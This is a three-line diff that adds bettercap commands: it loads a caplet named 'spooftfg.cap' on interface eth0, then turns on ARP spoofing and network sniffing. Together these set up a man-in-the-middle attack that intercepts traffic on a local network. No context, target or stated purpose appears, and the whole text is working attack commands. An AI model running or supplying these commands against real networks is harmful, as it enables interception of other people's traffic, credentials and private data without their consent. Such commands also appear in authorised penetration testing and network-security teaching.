@@ -1,0 +1,3 @@
+bettercap -iface eth0 -caplet spooftfg.cap
+arp.spoof on
+net.sniff on
